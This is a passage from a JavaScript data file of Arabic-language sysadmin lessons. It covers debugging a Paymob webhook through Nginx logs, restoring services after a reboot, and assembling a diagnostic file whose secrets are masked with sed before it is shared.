Oct 06 13:31:30 srv python3[7146]: api: "POST /webhooks/paymob HTTP/1.0" 401 -
...
Oct 06 13:31:30 srv python3[7146]: api: webhook paymob ok order=1001
Oct 06 13:31:30 srv python3[7146]: api: "POST /webhooks/paymob HTTP/1.0" 200 -
~~~

الـ 401 في Nginx دلوقتي ليها سبب مكتوب: [[invalid HMAC signature]]. لاحظ [[HTTP/1.0]] هنا و [[HTTP/1.1]] في لوج Nginx: Nginx بيكلّم التطبيق بـ 1.0 افتراضيًا، فده نفس الطلب. ([[journalctl -u api]] = لوج الخدمة دي بس، و [[--since "-2min"]] آخر دقيقتين.)

---

## ٤. قلّد Paymob بإيدك

~~~bash
curl -X POST https://example.com/webhooks/paymob -H "Content-Type: application/json" -d '{"obj":{"id":1,"success":true}}' -i | head -3
~~~

[[-X POST]] نوع الطلب، و [[-H]] header بيقول إن الـ body JSON، و [[-d]] الـ body، و [[-i]] اطبع الـ headers عشان تشوف الـ status.

~~~text الناتج (في المعمل على http)
HTTP/1.1 401 Unauthorized
Server: nginx/1.24.0 (Ubuntu)
Date: Tue, 06 Oct 2026 13:31:31 GMT
~~~

401 متوقعة لأنك مش معاك سر Paymob. بس ده أثبت إن الـ URL العام شغال، و DNS و Nginx والمسار كلهم وصّلوا للتطبيق. لو رجع 404 أو timeout، المشكلة قبل التطبيق. المهم تجرّبه على الـ URL **العام** (نفس اللي في لوحة Paymob)، مش على [[localhost]].

---

## ٥. [[dig +short example.com]]

الدومين اللي في الـ URL بيشاور على السيرفر ده؟

~~~text الناتج
104.20.23.154
172.66.147.243
~~~

في المعمل ده IP الـ example.com الحقيقي، مش سيرفري (جهازي واصل للسيرفر التجريبي بسطر في [[/etc/hosts]]، و [[getent hosts example.com]] طلّع [[172.20.0.2]]). Paymob مالوش [[/etc/hosts]] بتاعك: هو بيشوف إجابة [[dig]]. ودي بالظبط حالة «نقلت السيرفر ونسيت»: انت شايف كل حاجة شغالة، و Paymob بيبعت للمكان القديم.

---

## الجدول

| الأمر | الحلقة | لو فشل |
|---|---|---|
| [[grep]] المسار في access.log | وصل Nginx؟ | مفيش سطور: الـ URL أو DNS |
| [[awk '{print $9}']] مع uniq | Nginx/التطبيق رجّع إيه؟ | 401 توقيع، 404 مسار، 500 كود، 502 واقع |
| لوج التطبيق مع grep | ليه؟ | الرسالة بالسبب |
| [[curl -X POST]] على الـ URL العام | الطريق كله سليم؟ | 404 أو timeout قبل التطبيق |
| [[dig +short]] | الدومين بيشاور على السيرفر ده؟ | IP قديم |

## الخلاصة

- ابدأ من لوج Nginx: وصل ولا لأ، وبأي status.
- العمود التاسع بيقولك الحلقة المكسورة.
- اختبر بالـ URL العام. [[localhost]] مش اللي Paymob بيستخدمه.`,
          lines: [
            "طلبات مسار الـ webhook وصلت Nginx؟ لو فاضي، الـ URL عند Paymob غلط.",
            "الـ status اللي رجّعته لكل طلب: 401 توقيع، 500 كود، 404 مسار.",
            "لوج التطبيق للـ webhook.",
            "حاكي الطلب على الـ URL العام (مش localhost).",
            "الدومين بيشاور على السيرفر ده؟"
          ],
          sol: R`أهم أمر [[grep "/webhooks/paymob" access.log | awk '{print $9}' | uniq -c]]: العمود التاسع في لوج Nginx هو الـ status code اللي سيرفرك رجّعه لمزوّد الدفع. ده بيقولك الحكاية فورًا:

لو مفيش أي سطر خالص، يبقى الطلب مش واصل لسيرفرك أصلًا (المزوّد بيبعت لـ URL غلط، أو الدومين/DNS مش مظبوط، أو فايروول). لو فيه [[401]] يبقى التوقيع بيفشل (سر الـ webhook غلط أو الكود بيتحقق غلط). [[500]] الكود بيقع وهو بيعالج (شوف [[compose logs api | grep webhook]] للـ stack trace). [[404]] المسار غلط. [[200]] يبقى وصل واتعالج، والمشكلة في منطق الكود بعد كده.

[[curl -X POST .../webhooks/paymob -d '{...}']] بيخليك تقلّد المزوّد وتجرّب بنفسك (بس التوقيع هيفشل غالبًا لأنك مش موقّع صح، مفيد لاختبار الوصول والـ routing). القاعدة: ابدأ من لوج Nginx (وصل ولا لأ، وبأي كود)، وبعدين انزل للوج التطبيق. متفترضش إن المزوّد غلط قبل ما تشوف لوجك.`
        },
        {
          cmd: "بعد reboot حاجات مقامتش",
          title: "الموقع واقع بعد ريستارت السيرفر",
          desc: "السيرفر قام بس التطبيق لأ. كل حاجة شغّلتها بإيدك (nohup، أو docker run من غير restart policy، أو pm2 من غير save) مش بترجع. اللي بيرجع: خدمات systemd المعمولة enable، و containers بـ restart policy.",
          example: R`uptime
systemctl --failed
docker ps -a --format '{{.Names}} {{.Status}} {{.Label "com.docker.compose.project"}}'
docker inspect --format '{{.Name}} {{.HostConfig.RestartPolicy.Name}}' $(docker ps -aq)
systemctl is-enabled docker nginx postgresql 2>/dev/null
pm2 list && pm2 resurrect`,
          try: "بعد ما تصلّح، اعمل reboot تاني بإيدك وشوف كل حاجة بترجع. ده الاختبار الوحيد اللي بيثبت.",
          deep: {
            why: "الاستضافة عملت صيانة، أو الكيرنل اتحدّث، والسيرفر عمل ريستارت. اللي رجع هو اللي اتعمله enable، والباقي واقف. وده بيكشف كل حاجة كانت «شغالة بالصدفة».",
            how: R`[[uptime]]: من إمتى السيرفر شغال. لو دقايق وانت معملتش ريستارت، السيرفر عمل reboot لوحده (أو اتقتل بـ OOM على مستوى الـ hypervisor).

[[systemctl --failed]]: خدمات systemd حاولت تقوم وفشلت.

[[docker ps -a]]: الـ containers وحالتها. اللي Exited مش مرجعش. الأمر الرابع بيوريك restart policy لكل واحد: [[no]] معناه مش هيرجع أبدًا.

[[systemctl is-enabled docker nginx postgresql]]: الخدمات الأساسية enabled؟ Docker نفسه لو مش enabled، مفيش container هيقوم مهما كانت الـ policy.

[[pm2 resurrect]]: لو بتستخدم pm2، بيرجّع التطبيقات من آخر [[pm2 save]]. ولو [[pm2 startup]] معمول، ده بيحصل لوحده.

الأمر الطبيعي إنك تطبّق الوضع الصح: [[restart: unless-stopped]] في compose، و [[systemctl enable]] لكل خدمة، و [[pm2 save]]. وبعدين [[sudo reboot]] بإيدك في وقت هادي عشان تتأكد. الاختبار ده لازم يتعمل مرة على كل سيرفر قبل ما يبقى إنتاج.`,
            when: "الموقع واقع و uptime قليل. وقبل ما أي سيرفر يبقى إنتاج.",
            mistakes: "تشغّل كل حاجة بإيدك بعد الريستارت وتكمّل شغل. المرة الجاية هتحصل تاني الساعة ٣ الفجر."
          },
          teach: R`## الفكرة: بعد الريستارت، بيرجع بس اللي «اتسجّل» إنه يرجع

أي حاجة شغّلتها بإيدك (nohup، أو [[docker run]] من غير restart policy، أو خدمة عملتلها start من غير enable) بتموت مع الريستارت ومبترجعش. الأوامر بتكشف مين رجع ومين لأ، وليه.

عملت «reboot» حقيقي لسيرفر Ubuntu 24.04 بـ systemd جوه Docker (بـ [[docker restart]]، فـ systemd بيقوم من الأول). قبلها: عملت [[disable]] لـ Nginx، وضفت خدمة [[worker]] متفعّلة بس برنامجها مش موجود، وشغّلت سيرفر بـ [[nohup]] على 8081. والتطبيق [[api]] خدمة متفعّلة على 3000.

~~~text قبل الريستارت: ss -tlnp
LISTEN 0      511          0.0.0.0:80         0.0.0.0:*
LISTEN 0      5            0.0.0.0:3000       0.0.0.0:*
LISTEN 0      5            0.0.0.0:8081       0.0.0.0:*
~~~

~~~text بعد الريستارت
LISTEN 0      5            0.0.0.0:3000       0.0.0.0:*
~~~

Nginx (80) والـ nohup (8081) مرجعوش. الموقع واقع، والتطبيق نفسه شغال.

---

## ١. [[uptime]]

~~~text قبل وبعد
 13:32:22 up  6:56,  0 user,  load average: 0.01, 0.21, 0.58
 13:32:44 up  6:56,  0 user,  load average: 0.08, 0.21, 0.57
~~~

[[up 6:56]] متغيرش! لأن الـ container بيشارك الكيرنل مع الماكينة، و [[uptime]] بيقرا عمر الكيرنل. على VPS حقيقي، [[up 3 min]] وانت معملتش ريستارت = السيرفر عمل reboot (صيانة، أو تحديث كيرنل). في المعمل، عمر الـ systemd نفسه (العملية رقم ١) هو المقياس:

~~~bash
ps -o lstart= -p 1
~~~

~~~text الناتج
Tue Oct  6 13:32:32 2026
~~~

[[-p 1]] العملية رقم ١، و [[-o lstart=]] اطبع وقت بدايتها بس من غير عنوان. يعني «قام» من ثواني. ([[uptime -s]] على VPS بيطبع وقت الإقلاع مباشرة.)

---

## ٢. [[systemctl --failed]]

الخدمات اللي حاولت تقوم ووقعت:

~~~text الناتج
  UNIT           LOAD   ACTIVE SUB    DESCRIPTION
● worker.service loaded failed failed queue worker

1 loaded units listed.
~~~

[[worker]] حاول يقوم (لأنه enabled) ووقع. ليه؟ [[systemctl status worker]]:

~~~text الناتج (مقصوص)
× worker.service - queue worker
     Loaded: loaded (/etc/systemd/system/worker.service; enabled; preset: enabled)
     Active: failed (Result: exit-code) since Tue 2026-10-06 13:32:34 UTC; 18s ago
    Process: 124 ExecStart=/opt/worker/run.sh (code=exited, status=203/EXEC)
~~~

[[status=203/EXEC]] كود systemd معناه «مقدرتش أشغّل البرنامج ده أصلًا» (الملف مش موجود أو مش executable). وخد بالك: Nginx **مش** في القايمة، لأنه محاولش يقوم أصلًا. [[--failed]] بيوريك اللي وقع، مش اللي اتنسى.

---

## ٣. [[docker ps -a --format '{{.Names}} {{.Status}} {{.Label "com.docker.compose.project"}}']]

[[-a]] كل الـ containers حتى الواقفة. والـ format: الاسم، والحالة، و [[.Label "com.docker.compose.project"]] اسم مشروع Compose اللي عمله (لو اتعمل بـ Compose). الأخير بيقولك الـ container ده تبع أنهي فولدر.

~~~text الناتج (Docker على جهاز المعمل)
diag01-api Up 16 minutes diag01
diag01-pg Up 19 minutes diag01
diag01-client Up 50 minutes
diag01-srv Up 19 seconds
~~~

أول اتنين تبع مشروع [[diag01]]، والتانيين اتعملوا بـ [[docker run]] (العمود التالت فاضي). بعد reboot حقيقي، اللي مرجعش هتلاقيه [[Exited]].

---

## ٤. [[docker inspect --format '{{.Name}} {{.HostConfig.RestartPolicy.Name}}' $(docker ps -aq)]]

- [[docker ps -aq]] أرقام (IDs) كل الـ containers بس ([[-q]] = quiet).
- [[$(...)]] حطهم كلهم مكانه، فـ [[inspect]] يشتغل عليهم مرة واحدة.
- [[.HostConfig.RestartPolicy.Name]] الـ restart policy.

~~~text الناتج
/diag01-api unless-stopped
/diag01-pg no
/diag01-client no
/diag01-srv no
~~~

| القيمة | بعد reboot |
|---|---|
| [[no]] | مش هيرجع |
| [[always]] | هيرجع، حتى لو انت كنت موقفه بإيدك |
| [[unless-stopped]] | هيرجع، إلا لو انت موقفه بإيدك قبل الريستارت |
| [[on-failure]] | معمول عشان يرجّعه لو خرج بخطأ، مش للريستارت. استخدم [[unless-stopped]] |

ولقيت مشكلة حقيقية في مشروعي: [[api]] هيرجع، بس القاعدة [[db]] ([[diag01-pg]]) [[no]]، لأني نسيت [[restart:]] في الـ compose.yaml بتاعها. بعد reboot التطبيق هيقوم ويلاقي القاعدة واقفة. ده بالظبط العطل اللي الدرس بيتكلم عنه.

---

## ٥. [[systemctl is-enabled docker nginx postgresql 2>/dev/null]]

[[is-enabled]] بيرد بكلمة لكل خدمة بالترتيب:

~~~text الناتج
enabled
disabled
not-found
~~~

| الرد | معناه |
|---|---|
| [[enabled]] | هتقوم مع الإقلاع (docker) |
| [[disabled]] | مش هتقوم (nginx: وده سبب الوقوع) |
| [[not-found]] | الخدمة مش متسطبة أصلًا (postgresql هنا في container مش على السيرفر) |

الحل: [[sudo systemctl enable --now nginx]]: [[enable]] للمرات الجاية و [[--now]] شغّلها دلوقتي كمان. وخد بالك إن Docker نفسه لازم [[enabled]]، وإلا مفيش container هيرجع مهما كانت الـ policy.

---

## ٦. [[pm2 list && pm2 resurrect]]

~~~text الناتج في المعمل
bash: line 1: pm2: command not found
rc=127
~~~

المعمل مفيهوش pm2. من الـ docs: [[pm2 list]] بيعرض التطبيقات اللي pm2 شايلها، و [[pm2 resurrect]] بيرجّع اللي اتحفظ بآخر [[pm2 save]]. والحل الدائم [[pm2 startup]] مرة واحدة (بيطبعلك أمر تنفّذه بيعمل خدمة systemd) وبعده [[pm2 save]]. [[&&]] بتخلي [[resurrect]] يشتغل بس لو [[list]] نجح.

---

## الجدول

| الأمر | بيكشف | في المعمل |
|---|---|---|
| [[uptime]] (أو عمر PID 1) | حصل reboot؟ | أيوه، من ثواني |
| [[systemctl --failed]] | خدمات وقعت وهي بتقوم | [[worker]]: 203/EXEC |
| [[docker ps -a]] | containers مرجعتش | |
| [[inspect ... RestartPolicy]] | مين مش هيرجع | [[diag01-pg]]: no |
| [[is-enabled]] | خدمات مش مسجّلة | nginx: disabled |
| [[pm2 resurrect]] | تطبيقات pm2 | |

## الخلاصة

- [[start]] من غير [[enable]]، و [[docker run]] من غير [[--restart]]، و [[nohup]]: كلهم بيموتوا مع الريستارت.
- [[--failed]] مش بيوريك اللي اتنسى. [[is-enabled]] و الـ restart policy بيوروه.
- الاختبار الوحيد: اعمل reboot بإيدك في وقت هادي وشوف كل حاجة رجعت.`,
          lines: [
            "من إمتى شغال: لو دقايق، reboot حصل.",
            "خدمات فشلت في القيام.",
            "الـ containers وحالتها ومشروعها.",
            "restart policy لكل container: no = مش هيرجع.",
            "الخدمات الأساسية enabled؟",
            "رجّع تطبيقات pm2 من آخر save."
          ],
          sol: R`بعد أي reboot، الخدمات اللي مش مفعّلة على البدء التلقائي مش بتقوم لوحدها. [[uptime]] بيأكد إن السيرفر اترفع من شوية. [[systemctl --failed]] بيوريك الخدمات اللي حاولت تقوم وفشلت. [[systemctl is-enabled docker nginx postgresql]] بيوريك [[enabled]] أو [[disabled]] لكل واحدة: أي [[disabled]] مش هتقوم بعد reboot، فعّلها بـ [[systemctl enable --now X]].

للـ Docker: [[docker inspect --format '{{.HostConfig.RestartPolicy.Name}}']] لازم يكون [[always]] أو [[unless-stopped]] لكل container مهم؛ لو [[no]]، الـ container مش هيقوم بعد reboot، ظبطها في [[compose.yaml]] بـ [[restart: unless-stopped]]. لتطبيقات pm2: [[pm2 startup]] مرة واحدة (بيعمل خدمة systemd) و[[pm2 save]] عشان يفتكر اللي شغال.

الاختبار الوحيد اللي بيثبت إنك صلّحت: اعمل [[reboot]] تاني بإيدك وشوف كل حاجة رجعت لوحدها. متعتمدش على «المفروض يشتغل»، جرّب فعلًا. ده اللي بيفرّق بين سيرفر بيصحى لوحده بعد أي كهربا/تحديث، وسيرفر بيحتاجك تدخل بإيدك كل مرة.`
        },
        {
          cmd: "اعمل ده قبل ما تطلب مساعدة",
          title: "إيه اللي تجمعه",
          desc: "لما تطلب مساعدة (من زميل أو منتدى أو AI)، السؤال «الموقع واقع، ليه؟» ملوش إجابة. الأوامر دي بتجمع الصورة الكاملة في ملف واحد تبعته: النظام، والموارد، والخدمات، وآخر لوجات. من غير أسرار.",
          example: R`{ hostnamectl; uptime; free -h; df -h /; } > /tmp/diag.txt 2>&1
{ docker compose ps; docker compose logs --tail 50 --no-color; } >> /tmp/diag.txt 2>&1
sudo tail -30 /var/log/nginx/error.log >> /tmp/diag.txt 2>&1
{ curl -sI https://example.com | head -3; curl -sI http://127.0.0.1:3000/health | head -1; } >> /tmp/diag.txt 2>&1
sed -i -E 's/(password|secret|token|key)=[^ ]+/\1=***/gi' /tmp/diag.txt
wc -l /tmp/diag.txt && head -40 /tmp/diag.txt`,
          try: "اعمل من ده سكربت diag.sh على كل سيرفر. وقت الأزمة مش وقت تفتكر الأوامر.",
          deep: {
            why: "«الموقع واقع ليه؟» سؤال مش بيتجاوب. اللي هيساعدك محتاج يشوف اللي انت شايفه. ودقيقة تجميع بتوفر ساعة أسئلة وأجوبة.",
            how: R`الأقواس [[{ ...; }]] بتجمّع ناتج كذا أمر وتوجّهه مرة واحدة. الأمر الأول: النظام والموارد. التاني: حالة الـ containers وآخر ٥٠ سطر لوج ([[--no-color]] عشان الملف ميبقاش فيه رموز ألوان). التالت: أخطاء Nginx. الرابع: الرد من بره ومن جوه.

الـ [[sed]] الأخير مهم: بيدوّر على أي [[password=]] أو [[secret=]] أو [[token=]] أو [[key=]] ويستبدل القيمة بنجوم، عشان لما تبعت الملف لحد أو تلزقه في محادثة متسرّبش أسرار. راجع الملف بعينك برضه قبل الإرسال.

الملف ده هو اللي تبعته: فيه الأعراض (الـ status codes)، والحالة (ps)، والأدلة (اللوج)، والسياق (الموارد). أي حد يقدر يبدأ منه مباشرة.

حوّله لسكربت [[diag.sh]] على كل سيرفر، وضيف عليه اللي يخص مشروعك (لوج التطبيق، حالة القاعدة). وقت العطل بتكتب أمر واحد.`,
            when: "قبل ما تسأل أي حد. وكـ أول خطوة في أي عطل حتى لو هتحله لوحدك، لأنه بيرتّب الصورة.",
            mistakes: "تبعت screenshot من الترمنال فيه سطرين. وتبعت لوج فيه DATABASE_URL كامل."
          },
          teach: R`## الفكرة: ملف واحد فيه الصورة كلها، من غير أسرار

بدل «الموقع واقع، ليه؟»، تبعت ملف فيه: السيرفر إيه وحالته، والـ containers، وآخر الأخطاء، والموقع بيرد إزاي من بره ومن جوه. الأوامر الأربعة الأولى بتملا الملف، والخامس بيخفي الأسرار، والأخير بتراجعه بعينك.

شغّلته على سيرفر Ubuntu 24.04 تجريبي بـ systemd جوه Docker، عليه Nginx وتطبيق على 3000 ومشروع Compose فاضي، بعد ساعة من التجارب (فالـ error.log فيه أخطاء الدروس اللي فاتت).

---

## ١. [[{ hostnamectl; uptime; free -h; df -h /; } > /tmp/diag.txt 2>&1]]

### [[{ ...; }]]

القوسين المعقوفين بيجمّعوا كذا أمر كأنهم أمر واحد، فتوجّه ناتجهم كلهم مرة واحدة. لازم مسافة بعد [[{]]، و [[;]] قبل [[}]].

### [[> /tmp/diag.txt 2>&1]]

[[>]] اكتب الناتج في الملف (ولو موجود امسحه وابدأ من جديد)، و [[2>&1]] والأخطاء كمان في نفس الملف. كده لو أمر فشل، رسالة الفشل نفسها هتبقى في الملف، وده دليل.

### الأوامر نفسها

| الأمر | بيضيف |
|---|---|
| [[hostnamectl]] | اسم السيرفر والنظام والكيرنل |
| [[uptime]] | من امتى شغال والـ load |
| [[free -h]] | الرام |
| [[df -h /]] | الديسك الأساسي بس |

---

## ٢. [[{ docker compose ps; docker compose logs --tail 50 --no-color; } >> /tmp/diag.txt 2>&1]]

[[>>]] (اتنين) زوّد في آخر الملف من غير ما تمسح اللي فيه. وده لكل الأوامر بعد الأول.

[[--no-color]]: Compose بيلوّن اسم كل خدمة في الترمنال بأكواد خاصة. في ملف، الأكواد دي بتطلع كرموز غريبة (حرف ESC وبعده حاجة زي 36m). الـ flag بيشيلها.

---

## ٣. [[sudo tail -30 /var/log/nginx/error.log >> /tmp/diag.txt 2>&1]]

آخر ٣٠ خطأ من Nginx: 502 و 504 وأخطاء الشهادات بتبان هنا.

---

## ٤. [[{ curl -sI https://example.com | head -3; curl -sI http://127.0.0.1:3000/health | head -1; } >> /tmp/diag.txt 2>&1]]

الموقع من الطريق العام (DNS و SSL و Nginx)، والتطبيق مباشرة. لو الأول فشل والتاني نجح، اللي هيقرا الملف هيعرف على طول إن المشكلة قبل التطبيق.

---

## ٥. [[sed -i -E 's/(password|secret|token|key)=[^ ]+/\1=***/gi' /tmp/diag.txt]]

| الحتة | معناها |
|---|---|
| [[-i]] | عدّل الملف نفسه (in-place) بدل ما تطبع |
| [[-E]] | regex الحديث، عشان [[( )]] و [[|]] و [[+]] يشتغلوا من غير backslash |
| [[s/.../.../]] | استبدل |
| [[(password|secret|token|key)]] | أي كلمة من دول، ومحفوظة كمجموعة رقم ١ |
| [[=[^ ]+]] | علامة = وبعدها أي حروف لحد أول مسافة ([[[^ ]]] = أي حاجة غير مسافة) |
| [[\1]] | حط الكلمة اللي اتمسكت زي ما هي |
| [[g]] | كل مرة في السطر، مش أول مرة بس |
| [[i]] | من غير فرق كابيتال وسمول، فـ [[PASSWORD]] و [[Password]] يتمسكوا |

جرّبته على سطور عينة:

~~~text قبل
api_key=abc123 retry=3
DB_PASSWORD=hunter2
JWT_SECRET=s3cr3t
DATABASE_URL=postgres://app:S3cretPass@db:5432/app
Authorization: Bearer eyJhbGciOi
~~~

~~~text بعد
api_key=*** retry=3
DB_PASSWORD=***
JWT_SECRET=***
DATABASE_URL=postgres://app:S3cretPass@db:5432/app
Authorization: Bearer eyJhbGciOi
~~~

التلاتة الأولى اتخفوا ([[retry=3]] فضل لأن [[retry]] مش من الكلمات). بس آخر سطرين **فضلوا زي ما هما**: الباسورد جوه الـ URL مش بعد [[=]] مباشرة بكلمة من الأربعة، والتوكن بعد [[Bearer]] بمسافة. الـ sed شبكة أمان، مش ضمان. عشان كده الخطوة الأخيرة.

---

## ٦. [[wc -l /tmp/diag.txt && head -40 /tmp/diag.txt]]

[[wc -l]] عدد السطور (عشان تعرف الملف قد إيه)، و [[head -40]] أول ٤٠ سطر تراجعهم:

~~~text الناتج (مقصوص)
28 /tmp/diag.txt
 Static hostname: srv
       Icon name: computer-container
  Virtualization: wsl
Operating System: Ubuntu 24.04.5 LTS
          Kernel: Linux 6.6.87.2-microsoft-standard-WSL2
 13:33:51 up  6:57,  0 user,  load average: 0.10, 0.19, 0.54
               total        used        free      shared  buff/cache   available
Mem:            15Gi       1.2Gi       7.9Gi        54Mi       6.5Gi        14Gi
Filesystem      Size  Used Avail Use% Mounted on
overlay        1007G   19G  938G   2% /
NAME      IMAGE     COMMAND   SERVICE   CREATED   STATUS    PORTS
2026/10/06 12:51:29 [error] 857#857: *17 connect() failed (111: Connection refused) while connecting to upstream, ...
...
2026/10/06 13:31:16 [error] 7111#7111: *748 connect() failed (111: Connection refused) ... "POST /webhooks/paymob HTTP/1.1" ...
HTTP/2 200
date: Tue, 06 Oct 2026 13:33:53 GMT
content-type: text/html; charset=utf-8
HTTP/1.0 200 OK
~~~

اقراه زي ما اللي هيساعدك هيقراه: السيرفر أوبونتو 24.04، الرام والديسك فاضيين، مفيش containers في المشروع ده (سطر العناوين بس)، فيه 502 قديمة الساعة 12:51 و 13:31 (التطبيق كان واقع)، ودلوقتي الموقع والتطبيق الاتنين بيردوا 200. يعني اللي حصل مؤقت وانتهى، والسؤال بقى «ليه التطبيق وقع الساعة 13:31؟».

---

## الجدول

| السطر | بيضيف للملف |
|---|---|
| ١ | النظام والموارد ([[>]] يبدأ ملف جديد) |
| ٢ | الـ containers ولوجاتها ([[>>]] يزوّد) |
| ٣ | أخطاء Nginx |
| ٤ | الرد من بره ومن جوه |
| ٥ | إخفاء [[key=value]] للأسرار |
| ٦ | المراجعة بعينك |

## الخلاصة

- [[{ ...; }]] و [[>>]] و [[2>&1]] بيجمعوا كل حاجة في ملف واحد، والأخطاء كمان.
- الـ sed بيخفي [[password=...]] وأخواتها بس. الأسرار جوه URLs أو بعد [[Bearer]] بتعدّي.
- راجع الملف قبل ما تبعته. دايمًا.`,
          lines: [
            "النظام والموارد في ملف.",
            "حالة الـ containers وآخر لوج (من غير ألوان).",
            "أخطاء Nginx.",
            "الرد من بره ومن جوه.",
            "اخفي أي password أو secret أو token في الملف.",
            "راجعه قبل ما تبعته."
          ],
          sol: R`السكربت بيجمّع صورة كاملة عن حالة السيرفر في ملف واحد: معلومات النظام والرام والديسك، حالة الـ containers وآخر ٥٠ سطر لوج، آخر أخطاء Nginx، وحالة الموقع من بره ومن جوه. بدل ما ترمي «الموقع مش شغال» لحد يساعدك، بتديله [[/tmp/diag.txt]] فيه كل حاجة.

أهم سطر هو التنضيف: [[sed -i -E 's/(password|secret|token|key)=[^ ]+/\1=***/gi']] بيخفي الأسرار قبل ما تشارك الملف. جربته وفعلًا حوّل [[api_key=abc123]] لـ [[api_key=***]]. بس خد بالك من حدوده: هو بيمسك الشكل [[key=value]] بس، فسر جوه connection string زي [[postgres://user:secret@host]] مش هيتمسح (لأنه [[:secret@]] مش [[=secret]]). راجع الملف بعينك قبل ما تبعته، مش كل سر بالشكل ده.

الفكرة الأساسية: حوّل السكربت ده لـ [[diag.sh]] على كل سيرفر وقت الراحة. وقت الأزمة، المخ مش بيفتكر الأوامر، وضغط الوقت بيخلّيك تنسى تخفي الأسرار. سكربت جاهز = تشخيص أسرع ومشاركة أأمن.`
        }
      ]
    }
]);
